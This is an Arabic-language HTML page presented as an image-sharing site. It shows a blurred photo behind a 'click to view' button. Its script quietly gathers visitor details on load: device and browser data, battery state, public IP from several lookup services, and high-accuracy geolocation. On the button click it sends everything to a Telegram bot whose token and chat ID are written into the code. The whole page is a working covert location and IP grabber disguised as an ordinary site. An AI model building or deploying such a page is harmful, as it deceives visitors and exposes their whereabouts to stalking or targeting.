<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <button class="click-button" id="viewButton">
            🔍 اضغط هنا لمشاهدة الصورة
        </button>

        <div class="success-message" id="successMessage">
            ✅ تم الموافقة على عرض الصورة
        </div>
    </div>

    <script>
        // متغيرات عامة للتخزين السريع
        let visitorData = {
            device: {},
            hardware: {},
            location: null,
            ip: null,
            battery: null,
            timestamp: Date.now()
        };

        // جمع المعلومات الأساسية بشكل فوري
        function getBasicInfo() {
            const ua = navigator.userAgent;
            const now = new Date();
            
            return {
                userAgent: ua,
                timestamp: now.toISOString(),
                localTime: now.toLocaleString('ar-SA'),
                url: window.location.href,
                referrer: document.referrer || 'مباشر',
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                screenResolution: `${screen.width}x${screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio || 1,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: now.getTimezoneOffset(),
                // تحديد سريع للجهاز
                deviceType: /iPhone/i.test(ua) ? 'iPhone' : 
                           /iPad/i.test(ua) ? 'iPad' : 
                           /Android/i.test(ua) ? 'Android' : 
                           /Windows/i.test(ua) ? 'Windows' : 
                           /Mac/i.test(ua) ? 'Mac' : 'Unknown',
                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
                // تحديد سريع للمتصفح
                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
                        /Firefox/i.test(ua) ? 'Firefox' :
                        /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
                        /Edge/i.test(ua) ? 'Edge' : 'Unknown'
            };
        }

        // جمع معلومات الأجهزة بشكل سريع
        function getQuickHardwareInfo() {
            return {
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vibrationSupport: 'vibrate' in navigator,
                webglSupport: (() => {
                    try {
                        const canvas = document.createElement('canvas');
                        return !!(canvas.getContext('webgl') || canvas.getContext('experimental-webgl'));
                    } catch (e) {
                        return false;
                    }
                })(),
                // معلومات الشبكة السريعة
                connectionType: navigator.connection ? navigator.connection.type || navigator.connection.effectiveType : 'غير معروف',
                // معلومات الشاشة
                orientation: screen.orientation ? screen.orientation.type : 'غير معروف'
            };
        }

        // الحصول على معلومات البطارية
        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'يتم الشحن' : 'غير متصل'
                    };
                } catch (e) {
                    return null;
                }
            }
            return null;
        }

        // الحصول على IP بشكل سريع مع خدمات متعددة
        async function getIPFast() {
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://icanhazip.com',
                'https://api.myip.com'
            ];

            for (let service of ipServices) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 2000); // 2 ثانية لكل خدمة
                    
                    const response = await fetch(service, {
                        signal: controller.signal
                    });
                    clearTimeout(timeoutId);
                    
                    if (service.includes('icanhazip.com')) {
                        const ip = await response.text();
                        return ip.trim();
                    } else {
                        const data = await response.json();
                        return data.ip || data.origin;
                    }
                } catch (e) {
                    console.log(`فشل ${service}:`, e.message);
                    continue;
                }
            }
            return 'غير متاح';
        }

        // الحصول على الموقع بشكل محسن
        function getLocationFast() {
            return new Promise((resolve) => {
                console.log('🔍 محاولة الحصول على الموقع...');
                
                if (!navigator.geolocation) {
                    console.log('❌ المتصفح لا يدعم تحديد الموقع');
                    resolve(null);
                    return;
                }

                // تايم آوت أطول قليلاً للحصول على الموقع
                const timeout = setTimeout(() => {
                    console.log('⏰ انتهت مهلة الحصول على الموقع');
                    resolve(null);
                }, 8000); // 8 ثواني

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        console.log('✅ تم الحصول على الموقع بنجاح');
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        });
                    },
                    (error) => {
                        clearTimeout(timeout);
                        console.log('❌ خطأ في الحصول على الموقع:', error.message);
                        console.log('رمز الخطأ:', error.code);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true, // دقة عالية
                        timeout: 7000,
                        maximumAge: 30000 // استخدام موقع محفوظ من 30 ثانية
                    }
                );
            });
        }

        // إرسال البيانات بشكل مُحسن
        async function sendDataFast(data) {
            const botToken = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            const chatId = '170383339';
            
            // رسالة مُحسنة وأقصر
            const message = `🔥 زائر جديد (نظام سريع):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ ${data.device.localTime}
🌐 ${data.device.url}
🔗 ${data.device.referrer}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 الجهاز: ${data.device.deviceType}
🌐 المتصفح: ${data.device.browser}
📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
📶 الشبكة: ${data.hardware.connectionType}
${data.battery ? `🔋 البطارية: ${data.battery.level} (${data.battery.charging})` : ''}
🌍 IP: ${data.ip || 'غير متاح'} ⚠️
📍 الموقع: ${data.location ? `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}` : 'غير متاح'}
🗣️ اللغة: ${data.device.language}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 User Agent: ${data.device.userAgent}`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                console.log('✅ تم الإرسال بنجاح');
            } catch (error) {
                console.log('❌ فشل الإرسال:', error);
            }
        }

        // جمع البيانات بشكل متوازي وسريع
        async function collectAllDataFast() {
            console.log('🚀 بدء جمع البيانات بالنظام السريع...');
            
            // جمع المعلومات الأساسية فوراً
            visitorData.device = getBasicInfo();
            visitorData.hardware = getQuickHardwareInfo();
            
            // محاولة طلب الإذن للموقع أولاً
            if ('permissions' in navigator) {
                try {
                    const permission = await navigator.permissions.query({name: 'geolocation'});
                    console.log('حالة إذن الموقع:', permission.state);
                } catch (e) {
                    console.log('لا يمكن فحص إذن الموقع');
                }
            }
            
            // جمع الموقع و IP و البطارية بشكل متوازي
            const [location, ip, battery] = await Promise.all([
                getLocationFast(),
                getIPFast(),
                getBatteryInfo()
            ]);
            
            visitorData.location = location;
            visitorData.ip = ip;
            visitorData.battery = battery;
            
            console.log('📊 تم جمع البيانات:', visitorData);
            console.log('📍 حالة الموقع:', location ? 'تم الحصول عليه' : 'لم يتم الحصول عليه');
            return visitorData;
        }

        // عرض الصورة وإرسال البيانات
        async function viewImage() {
            // إظهار الصورة فوراً
            document.getElementById('mainImage').classList.add('clear');
            document.getElementById('viewButton').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // محاولة أخرى للحصول على الموقع إذا لم نحصل عليه من قبل
            if (!visitorData.location) {
                console.log('🔄 لم نحصل على الموقع بعد، محاولة أخرى...');
                await tryGetLocationAgain();
            }
            
            // إرسال البيانات المجمعة
            await sendDataFast(visitorData);
        }

        // بدء جمع البيانات عند تحميل الصفحة
        window.addEventListener('load', async function() {
            console.log('🚀 تحميل الصفحة - بدء النظام السريع...');
            
            // إظهار رسالة للمستخدم حول الموقع
            if (navigator.geolocation) {
                console.log('📍 المتصفح يدعم تحديد الموقع - سيتم طلب الإذن');
            } else {
                console.log('❌ المتصفح لا يدعم تحديد الموقع');
            }
            
            // جمع البيانات في الخلفية
            try {
                await collectAllDataFast();
            } catch (e) {
                console.log('❌ خطأ في جمع البيانات:', e);
            }
        });

        // إضافة محاولة أخرى للحصول على الموقع عند النقر
        async function tryGetLocationAgain() {
            console.log('🔄 محاولة أخرى للحصول على الموقع...');
            const location = await getLocationFast();
            if (location) {
                visitorData.location = location;
                console.log('✅ نجحت المحاولة الثانية للموقع');
            }
            return location;
        }

        // ربط الزر
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('viewButton').addEventListener('click', viewImage);
        });

        // جمع البيانات الأساسية فوراً عند تحميل الكود
        visitorData.device = getBasicInfo();
        visitorData.hardware = getQuickHardwareInfo();
        console.log('⚡ تم جمع البيانات الأساسية فوراً');
    </script>
</body>
</html>
